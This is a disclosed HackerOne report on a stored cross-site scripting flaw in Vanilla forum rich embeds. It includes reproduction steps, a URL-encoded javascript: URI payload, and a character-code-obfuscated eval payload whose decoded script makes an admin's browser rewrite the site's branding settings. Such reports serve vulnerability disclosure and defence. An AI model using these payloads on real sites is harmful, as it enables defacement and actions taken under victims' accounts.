@@ -1,0 +1,70 @@
+ReportLink:https://hackerone.com/reports/530458
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/klmunday
+ReportedTo:Vanilla(vanilla)
+BountyAmount:300.0
+Severity:high
+State:Closed
+DateOfDisclosure:17.07.2019 20:14:22
+
+Summary:
+
+**Summary:**
+Rich embed posts can contain javascript URIs which when clicked will trigger javascript code.
+
+**Description:**
+Registered users can post content (in forum posts, private messages and activity posts) containing Rich embeds where the date/time of the embedded post when clicked, will trigger a stored XSS vulnerability.
+
+## Steps to reproduce:
+
+1. Ensure you are logged into an account (does not need any special permissions, just a regular account)
+2. Navigate to any page with the rich text editor (e.g. http://localhost/profile/)
+3. Write anything in the editor and click Share/send
+4. Intercept the request (Via BurpSuite etc)
+5. Edit the request and change the `Comment` parameter to the following:
+```
+%5B%7B%22insert%22%3A%7B%22embed-external%22%3A%7B%22data%22%3A%7B%22url%22%3A%22%22%2C%22type%22%3A%22quote%22%2C%22name%22%3Anull%2C%22body%22%3Anull%2C%22photoUrl%22%3Anull%2C%22height%22%3Anull%2C%22width%22%3Anull%2C%22attributes%22%3A%7B%22commentID%22%3A2%2C%22bodyRaw%22%3A%22this%20is%20an%20xss%20test%2C%20click%20the%20date%20time%20for%20this%20embed%21%22%2C%22dateInserted%22%3A%222019-03-17T05%3A49%3A04%2B00%3A00%22%2C%22dateUpdated%22%3Anull%2C%22insertUser%22%3A%7B%22userID%22%3A6%2C%22name%22%3A%22Click%20the%20date%20--%3E%22%2C%22photoUrl%22%3A%22https%3A%2F%2Fimages.v-cdn.net%2Fstubcontent%2Favatar_03.png%22%2C%22dateLastActive%22%3A%222019-03-17T05%3A49%3A03%2B00%3A00%22%7D%2C%22url%22%3A%22javascript%3Aalert%281%29%22%2C%22format%22%3A%22Markdown%22%7D%7D%2C%22loaderData%22%3A%7B%22type%22%3A%22link%22%2C%22link%22%3A%22%22%7D%7D%7D%7D%2C%7B%22insert%22%3A%22%5Cn%22%7D%5D
+```
+6. Forward the request
+7. Click the date/time in the embed
+8. XSS should be triggered
+
+## Simple video
+#F463833
+
+It also does not occur only on forum posts as shown above
+It works on private messages:
+#F463814
+
+It also works on Activity posts:
+#F463817
+
+
+## Anything else we should know?
+More complex payloads can be embedded by utilizing Eval with an array of character codes and specific payloads can be created to target Admins to perform nearly any action an attacker desired.  (see video below)
+#F463834
+the `Comment` used in this video is:
+
+```
+%5B%7B%22insert%22%3A%7B%22embed-external%22%3A%7B%22data%22%3A%7B%22url%22%3A%22%22%2C%22type%22%3A%22quote%22%2C%22name%22%3Anull%2C%22body%22%3Anull%2C%22photoUrl%22%3Anull%2C%22height%22%3Anull%2C%22width%22%3Anull%2C%22attributes%22%3A%7B%22commentID%22%3A2%2C%22bodyRaw%22%3A%22this%20is%20an%20xss%20test%2C%20click%20the%20date%20time%20for%20this%20embed%21%22%2C%22dateInserted%22%3A%222019-03-17T05%3A49%3A04%2B00%3A00%22%2C%22dateUpdated%22%3Anull%2C%22insertUser%22%3A%7B%22userID%22%3A6%2C%22name%22%3A%22Click%20the%20date%20--%3E%22%2C%22photoUrl%22%3A%22https%3A%2F%2Fimages.v-cdn.net%2Fstubcontent%2Favatar_03.png%22%2C%22dateLastActive%22%3A%222019-03-17T05%3A49%3A03%2B00%3A00%22%7D%2C%22url%22%3A%22javascript%3Aeval%28String.fromCharCode.apply%28null%2C%5B108%2C101%2C116%2C32%2C117%2C114%2C108%2C32%2C61%2C32%2C108%2C111%2C99%2C97%2C116%2C105%2C111%2C110%2C46%2C111%2C114%2C105%2C103%2C105%2C110%2C32%2C43%2C32%2C39%2C47%2C100%2C97%2C115%2C104%2C98%2C111%2C97%2C114%2C100%2C47%2C115%2C101%2C116%2C116%2C105%2C110%2C103%2C115%2C47%2C98%2C114%2C97%2C110%2C100%2C105%2C110%2C103%2C39%2C59%2C10%2C10%2C112%2C97%2C114%2C101%2C110%2C116%2C46%2C106%2C81%2C117%2C101%2C114%2C121%2C46%2C97%2C106%2C97%2C120%2C40%2C123%2C117%2C114%2C108%2C58%2C32%2C117%2C114%2C108%2C44%2C32%2C116%2C121%2C112%2C101%2C58%2C32%2C39%2C71%2C69%2C84%2C39%2C44%2C32%2C115%2C117%2C99%2C99%2C101%2C115%2C115%2C58%2C32%2C102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C40%2C104%2C116%2C109%2C108%2C95%2C114%2C101%2C115%2C112%2C111%2C110%2C115%2C101%2C41%2C32%2C123%2C10%2C32%2C32%2C32%2C32%2C108%2C101%2C116%2C32%2C100%2C111%2C109%2C32%2C61%2C32%2C112%2C97%2C114%2C101%2C110%2C116%2C46%2C106%2C81%2C117%2C101%2C114%2C121%2C40%2C104%2C116%2C109%2C108%2C95%2C114%2C101%2C115%2C112%2C111%2C110%2C115%2C101%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C100%2C111%2C109%2C46%2C102%2C105%2C110%2C100%2C40%2C39%2C105%2C110%2C112%2C117%2C116%2C91%2C110%2C97%2C109%2C101%2C61%2C34%2C71%2C97%2C114%2C100%2C101%2C110%2C45%2C100%2C111%2C116%2C45%2C72%2C111%2C109%2C101%2C112%2C97%2C103%2C101%2C84%2C105%2C116%2C108%2C101%2C34%2C93%2C39%2C41%2C46%2C118%2C97%2C108%2C40%2C34%2C72%2C97%2C99%2C107%2C101%2C100%2C34%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C100%2C111%2C109%2C46%2C102%2C105%2C110%2C100%2C40%2C39%2C105%2C110%2C112%2C117%2C116%2C91%2C110%2C97%2C109%2C101%2C61%2C34%2C71%2C97%2C114%2C100%2C101%2C110%2C45%2C100%2C111%2C116%2C45%2C84%2C105%2C116%2C108%2C101%2C34%2C93%2C39%2C41%2C46%2C118%2C97%2C108%2C40%2C34%2C72%2C97%2C99%2C107%2C101%2C100%2C34%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C100%2C111%2C109%2C46%2C102%2C105%2C110%2C100%2C40%2C39%2C116%2C101%2C120%2C116%2C97%2C114%2C101%2C97%2C91%2C110%2C97%2C109%2C101%2C61%2C34%2C71%2C97%2C114%2C100%2C101%2C110%2C45%2C100%2C111%2C116%2C45%2C68%2C101%2C115%2C99%2C114%2C105%2C112%2C116%2C105%2C111%2C110%2C34%2C93%2C39%2C41%2C46%2C118%2C97%2C108%2C40%2C34%2C104%2C97%2C99%2C107%2C101%2C100%2C32%2C118%2C105%2C97%2C32%2C120%2C115%2C115%2C34%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C108%2C101%2C116%2C32%2C100%2C97%2C116%2C97%2C32%2C61%2C32%2C110%2C101%2C119%2C32%2C70%2C111%2C114%2C109%2C68%2C97%2C116%2C97%2C40%2C100%2C111%2C109%2C46%2C102%2C105%2C110%2C100%2C40%2C39%2C102%2C111%2C114%2C109%2C39%2C41%2C91%2C48%2C93%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C112%2C97%2C114%2C101%2C110%2C116%2C46%2C106%2C81%2C117%2C101%2C114%2C121%2C46%2C97%2C106%2C97%2C120%2C40%2C123%2C117%2C114%2C108%2C58%2C32%2C117%2C114%2C108%2C44%2C32%2C116%2C121%2C112%2C101%2C58%2C32%2C39%2C80%2C79%2C83%2C84%2C39%2C44%2C32%2C101%2C110%2C99%2C116%2C121%2C112%2C101%2C58%2C32%2C39%2C109%2C117%2C108%2C116%2C105%2C112%2C97%2C114%2C116%2C47%2C102%2C111%2C114%2C109%2C45%2C100%2C97%2C116%2C97%2C39%2C44%2C32%2C112%2C114%2C111%2C99%2C101%2C115%2C115%2C68%2C97%2C116%2C97%2C58%2C32%2C102%2C97%2C108%2C115%2C101%2C44%2C32%2C99%2C111%2C110%2C116%2C101%2C110%2C116%2C84%2C121%2C112%2C101%2C58%2C32%2C102%2C97%2C108%2C115%2C101%2C44%2C32%2C99%2C97%2C99%2C104%2C101%2C58%2C32%2C102%2C97%2C108%2C115%2C101%2C44%2C32%2C100%2C97%2C116%2C97%2C58%2C32%2C100%2C97%2C116%2C97%2C125%2C41%2C10%2C125%2C125%2C41%2C59%5D%29%29%22%2C%22format%22%3A%22Markdown%22%7D%7D%2C%22loaderData%22%3A%7B%22type%22%3A%22link%22%2C%22link%22%3A%22%22%7D%7D%7D%7D%2C%7B%22insert%22%3A%22%5Cn%22%7D%5D
+```
+and contains the following code:
+```js
+let url = location.origin + '/dashboard/settings/branding';
+
+parent.jQuery.ajax({url: url, type: 'GET', success: function(html_response) {
+    let dom = parent.jQuery(html_response);
+    dom.find('input[name="Garden-dot-HomepageTitle"]').val("Hacked");
+    dom.find('input[name="Garden-dot-Title"]').val("Hacked");
+    dom.find('textarea[name="Garden-dot-Description"]').val("hacked via xss");
+    let data = new FormData(dom.find('form')[0]);
+    parent.jQuery.ajax({url: url, type: 'POST', enctype: 'multipart/form-data', processData: false, contentType: false, cache: false, data: data})
+}});
+```
+
+## Suggested fix/notes
+It seems to be a consistent issue with how embeds are handled within the context of `Rich` posts. As stated earlier it seems to happen anywhere they can be sent: Activity posts, private messages, forum replies, forum post creation. Common component seems to be the `richEditor`
+
+## Impact
+
+An attacker could craft a payload which when triggered could perform sensitive actions such as reading private information, change certain details and even create/edit posts. If an admin was targeted then the scope of data and actions increases to nearly cover the entire site.
